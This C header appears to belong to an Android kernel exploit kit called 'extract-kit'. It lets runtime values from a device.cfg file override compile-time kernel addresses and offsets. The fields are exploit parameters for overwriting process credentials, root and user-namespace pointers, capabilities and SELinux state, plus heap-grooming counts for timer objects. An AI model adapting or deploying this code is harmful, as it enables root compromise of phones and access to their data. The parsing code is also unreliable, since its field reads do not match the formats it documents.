/*
 * runtime_cfg.h - 让 device_config.h 里的常量可以在运行期被覆盖。
 *
 * 为什么要它：payload 的地址/偏移都是编译期常量，换内核就得重编。App 里已经能
 * 从 boot.img 算出这些值（标定页），所以把常量搬进一个可写的全局结构体，
 * 启动时从 /data/local/tmp/extract-kit/device.cfg 读一份覆盖值即可 —— 不用重编。
 *
 * 文件格式（小端，与 App 的 ConfigGen.emitCfgBlob 一一对应）：
 *   char magic[8] = "EXKCFG01"
 *   u32  count    = 39            // u64 字段个数（38 = 旧格式，cred_uid_off 默认 8）
 *   u64  field[count]             // 顺序见下面的 load_device_cfg()
 *   u32  ev[5]                    // cache_alloc/cache_free/page_free/page_alloc/pcpu_drain
 *
 * 没有这个文件时，一切按编译期默认值跑（和以前行为完全一致）。
 */
#ifndef RUNTIME_CFG_H
#define RUNTIME_CFG_H

#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>

#define CFG_MAGIC "EXKCFG01"
#define CFG_PATH_DIR "/data/local/tmp/extract-kit/device.cfg"
#define CFG_PATH_TMP "/data/local/tmp/device.cfg"

struct device_cfg {
	uint64_t static_timer_site;
	uint64_t timer_site_low21;
	uint64_t selinux_state_static;
	uint64_t panic_on_warn_static;
	uint64_t root_user_static;
	uint64_t init_user_ns_static;
	uint64_t init_ucounts_static;
	uint64_t init_groups_static;
	uint64_t off_task_cred;
	uint64_t off_task_comm;
	uint64_t task_alloc_low21;
	uint64_t task_alloc_bytes;
	uint64_t task_alloc_round;
	uint64_t cred_req;
	uint64_t cred_alloc;
	uint64_t cred_site_low21;
	uint64_t itimer_size;
	uint64_t itimer_node;
	uint64_t itimer_head;
	uint64_t itimer_elist;
	uint64_t itimer_firing;
	uint64_t itimer_handling;
	uint64_t timer_obj;
	uint64_t cred_uid_off;
	uint64_t cred_off_security;
	uint64_t cred_off_user;
	uint64_t cred_off_user_ns;
	uint64_t cred_off_ucounts;
	uint64_t cred_off_groups;
	uint64_t cred_blob_off;
	uint64_t selinux_blob_off;
	uint64_t selinux_sid_kernel;
	uint64_t fullcap;
	uint64_t ntimers;
	uint64_t victim_idx;
	uint64_t padding_timers;
	uint64_t lockers;
	uint64_t vma_count;
	uint32_t ev[5];
};

/* 1 = device.cfg 是 39 字段的新格式（带 cred_uid_off） */
static int g_cfg_v2;

/* 编译期默认值（来自 device_config.h） */
static struct device_cfg g_cfg = {
	.static_timer_site = STATIC_TIMER_SITE,
	.timer_site_low21 = TIMER_SITE_LOW21,
	.selinux_state_static = SELINUX_STATE_STATIC,
	.panic_on_warn_static = PANIC_ON_WARN_STATIC,
	.root_user_static = ROOT_USER_STATIC,
	.init_user_ns_static = INIT_USER_NS_STATIC,
	.init_ucounts_static = INIT_UCOUNTS_STATIC,
	.init_groups_static = INIT_GROUPS_STATIC,
	.off_task_cred = OFF_TASK_CRED,
	.off_task_comm = OFF_TASK_COMM,
	.task_alloc_low21 = TASK_ALLOC_LOW21,
	.task_alloc_bytes = TASK_ALLOC_BYTES,
	.task_alloc_round = TASK_ALLOC_ROUND,
	.cred_req = CRED_REQ,
	.cred_alloc = CRED_ALLOC,
	.cred_site_low21 = CRED_SITE_LOW21,
	.itimer_size = ITIMER_SIZE,
	.itimer_node = ITIMER_NODE,
	.itimer_head = ITIMER_HEAD,
	.itimer_elist = ITIMER_ELIST,
	.itimer_firing = ITIMER_FIRING,
	.itimer_handling = ITIMER_HANDLING,
	.timer_obj = TIMER_OBJ,
	.cred_uid_off = CRED_UID_OFF,
	.cred_off_security = CRED_OFF_SECURITY,
	.cred_off_user = CRED_OFF_USER,
	.cred_off_user_ns = CRED_OFF_USER_NS,
	.cred_off_ucounts = CRED_OFF_UCOUNTS,
	.cred_off_groups = CRED_OFF_GROUPS,
	.cred_blob_off = CRED_BLOB_OFF,
	.selinux_blob_off = SELINUX_BLOB_OFF,
	.selinux_sid_kernel = SELINUX_SID_KERNEL,
	.fullcap = FULLCAP,
	.ntimers = NTIMERS,
	.victim_idx = VICTIM_IDX,
	.padding_timers = PADDING_TIMERS,
	.lockers = LOCKERS,
	.vma_count = VMA_COUNT,
	.ev = { EV_CACHE_ALLOC, EV_CACHE_FREE, EV_PAGE_FREE, EV_PAGE_ALLOC, EV_PCPU_DRAIN },
};

/* 之后所有用法都走 g_cfg，函数体一行不用改 */
#undef STATIC_TIMER_SITE
#define STATIC_TIMER_SITE (g_cfg.static_timer_site)
#undef TIMER_SITE_LOW21
#define TIMER_SITE_LOW21 (g_cfg.timer_site_low21)
#undef SELINUX_STATE_STATIC
#define SELINUX_STATE_STATIC (g_cfg.selinux_state_static)
#undef PANIC_ON_WARN_STATIC
#define PANIC_ON_WARN_STATIC (g_cfg.panic_on_warn_static)
#undef ROOT_USER_STATIC
#define ROOT_USER_STATIC (g_cfg.root_user_static)
#undef INIT_USER_NS_STATIC
#define INIT_USER_NS_STATIC (g_cfg.init_user_ns_static)
#undef INIT_UCOUNTS_STATIC
#define INIT_UCOUNTS_STATIC (g_cfg.init_ucounts_static)
#undef INIT_GROUPS_STATIC
#define INIT_GROUPS_STATIC (g_cfg.init_groups_static)
#undef OFF_TASK_CRED
#define OFF_TASK_CRED (g_cfg.off_task_cred)
#undef OFF_TASK_COMM
#define OFF_TASK_COMM (g_cfg.off_task_comm)
#undef TASK_ALLOC_LOW21
#define TASK_ALLOC_LOW21 (g_cfg.task_alloc_low21)
#undef TASK_ALLOC_BYTES
#define TASK_ALLOC_BYTES (g_cfg.task_alloc_bytes)
#undef TASK_ALLOC_ROUND
#define TASK_ALLOC_ROUND (g_cfg.task_alloc_round)
#undef CRED_REQ
#define CRED_REQ (g_cfg.cred_req)
#undef CRED_ALLOC
#define CRED_ALLOC (g_cfg.cred_alloc)
#undef CRED_SITE_LOW21
#define CRED_SITE_LOW21 (g_cfg.cred_site_low21)
#undef ITIMER_SIZE
#define ITIMER_SIZE (g_cfg.itimer_size)
#undef ITIMER_NODE
#define ITIMER_NODE (g_cfg.itimer_node)
#undef ITIMER_HEAD
#define ITIMER_HEAD (g_cfg.itimer_head)
#undef ITIMER_ELIST
#define ITIMER_ELIST (g_cfg.itimer_elist)
#undef ITIMER_FIRING
#define ITIMER_FIRING (g_cfg.itimer_firing)
#undef ITIMER_HANDLING
#define ITIMER_HANDLING (g_cfg.itimer_handling)
#undef TIMER_OBJ
#define TIMER_OBJ (g_cfg.timer_obj)
#undef CRED_UID_OFF
#define CRED_UID_OFF (g_cfg.cred_uid_off)
#undef CRED_OFF_SECURITY
#define CRED_OFF_SECURITY (g_cfg.cred_off_security)
#undef CRED_OFF_USER
#define CRED_OFF_USER (g_cfg.cred_off_user)
#undef CRED_OFF_USER_NS
#define CRED_OFF_USER_NS (g_cfg.cred_off_user_ns)
#undef CRED_OFF_UCOUNTS
#define CRED_OFF_UCOUNTS (g_cfg.cred_off_ucounts)
#undef CRED_OFF_GROUPS
#define CRED_OFF_GROUPS (g_cfg.cred_off_groups)
#undef CRED_BLOB_OFF
#define CRED_BLOB_OFF (g_cfg.cred_blob_off)
#undef SELINUX_BLOB_OFF
#define SELINUX_BLOB_OFF (g_cfg.selinux_blob_off)
#undef SELINUX_SID_KERNEL
#define SELINUX_SID_KERNEL ((uint32_t)g_cfg.selinux_sid_kernel)
#undef FULLCAP
#define FULLCAP (g_cfg.fullcap)
#undef NTIMERS
#define NTIMERS ((int)g_cfg.ntimers)
#undef VICTIM_IDX
#define VICTIM_IDX ((int)g_cfg.victim_idx)
#undef LOCKERS
#define LOCKERS ((int)g_cfg.lockers)
#undef VMA_COUNT
#define VMA_COUNT ((unsigned long)g_cfg.vma_count)
#undef EV_CACHE_ALLOC
#define EV_CACHE_ALLOC (g_cfg.ev[0])
#undef EV_CACHE_FREE
#define EV_CACHE_FREE (g_cfg.ev[1])
#undef EV_PAGE_FREE
#define EV_PAGE_FREE (g_cfg.ev[2])
#undef EV_PAGE_ALLOC
#define EV_PAGE_ALLOC (g_cfg.ev[3])
#undef EV_PCPU_DRAIN
#define EV_PCPU_DRAIN (g_cfg.ev[4])

/* PADDING_TIMERS 还用来定数组长度，所以保留编译期值；运行期只调"用多少个"。 */
static int g_pad_timers = PADDING_TIMERS;

static uint64_t cfg_rd64(const unsigned char **p)
{
	uint64_t v;

	memcpy(&v, *p, 8);
	*p += 8;
	return v;
}

static uint32_t cfg_rd32(const unsigned char **p)
{
	uint32_t v;

	memcpy(&v, *p, 4);
	*p += 4;
	return v;
}

/** 返回 1 表示读到了覆盖值，0 表示用编译期默认。 */
static int load_device_cfg(void)
{
	unsigned char buf[512];
	const unsigned char *p;
	int fd, n;

	fd = open(CFG_PATH_DIR, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		fd = open(CFG_PATH_TMP, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return 0;
	n = (int)read(fd, buf, sizeof(buf));
	close(fd);
	if (n < 12 + 38 * 8 + 5 * 4)
		return 0;
	if (memcmp(buf, CFG_MAGIC, 8))
		return 0;

	p = buf + 8;
	{
		uint32_t count = cfg_rd32(&p);

		if (count != 38 && count != 39)
			return 0;
		g_cfg_v2 = count >= 39;
	}

	g_cfg.static_timer_site = cfg_rd64(&p);
	g_cfg.timer_site_low21 = cfg_rd64(&p);
	g_cfg.selinux_state_static = cfg_rd64(&p);
	g_cfg.panic_on_warn_static = cfg_rd64(&p);
	g_cfg.root_user_static = cfg_rd64(&p);
	g_cfg.init_user_ns_static = cfg_rd64(&p);
	g_cfg.init_ucounts_static = cfg_rd64(&p);
	g_cfg.init_groups_static = cfg_rd64(&p);
	g_cfg.off_task_cred = cfg_rd64(&p);
	g_cfg.off_task_comm = cfg_rd64(&p);
	g_cfg.task_alloc_low21 = cfg_rd64(&p);
	g_cfg.task_alloc_bytes = cfg_rd64(&p);
	g_cfg.task_alloc_round = cfg_rd64(&p);
	g_cfg.cred_req = cfg_rd64(&p);
	g_cfg.cred_alloc = cfg_rd64(&p);
	g_cfg.cred_site_low21 = cfg_rd64(&p);
	g_cfg.itimer_size = cfg_rd64(&p);
	g_cfg.itimer_node = cfg_rd64(&p);
	g_cfg.itimer_head = cfg_rd64(&p);
	g_cfg.itimer_elist = cfg_rd64(&p);
	g_cfg.itimer_firing = cfg_rd64(&p);
	g_cfg.itimer_handling = cfg_rd64(&p);
	g_cfg.timer_obj = cfg_rd64(&p);
	g_cfg.cred_uid_off = cfg_rd64(&p);
	g_cfg.cred_off_security = cfg_rd64(&p);
	g_cfg.cred_off_user = cfg_rd64(&p);
	g_cfg.cred_off_user_ns = cfg_rd64(&p);
	g_cfg.cred_off_ucounts = cfg_rd64(&p);
	g_cfg.cred_off_groups = cfg_rd64(&p);
	/* 早期 v2 格式在这里多写了一个重复的 cred_uid，读到就跳过，避免后面整体错位 */
	if (g_cfg_v2)
		(void)cfg_rd64(&p);
	g_cfg.cred_blob_off = cfg_rd64(&p);
	g_cfg.selinux_blob_off = cfg_rd64(&p);
	g_cfg.selinux_sid_kernel = cfg_rd64(&p);
	g_cfg.fullcap = cfg_rd64(&p);
	g_cfg.ntimers = cfg_rd64(&p);
	g_cfg.victim_idx = cfg_rd64(&p);
	g_cfg.padding_timers = cfg_rd64(&p);
	g_cfg.lockers = cfg_rd64(&p);
	g_cfg.vma_count = cfg_rd64(&p);
	for (int i = 0; i < 5; i++)
		g_cfg.ev[i] = cfg_rd32(&p);

	if (g_cfg.padding_timers > 0 && g_cfg.padding_timers < (uint64_t)PADDING_TIMERS)
		g_pad_timers = (int)g_cfg.padding_timers;
	return 1;
}

#endif /* RUNTIME_CFG_H */
